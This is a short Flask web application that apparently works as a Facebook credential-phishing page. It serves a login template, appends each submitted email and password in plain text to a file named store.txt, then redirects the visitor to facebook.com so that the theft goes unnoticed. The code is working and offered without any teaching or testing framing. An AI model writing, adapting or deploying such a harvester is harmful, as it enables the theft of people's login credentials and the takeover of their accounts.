from flask import Flask,render_template,request,redirect

app = Flask(__name__,static_url_path='',static_folder="./static/")

@app.route("/",methods=["GET","POST"])
def landing():
    
    if request.method == "POST":
        userid = request.form["email"]
        password = request.form["pass"]

        with open("store.txt","a") as file:
            file.writelines(f"Userid : {userid}  Password : {password}\n")

        return redirect("https://facebook.com/")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)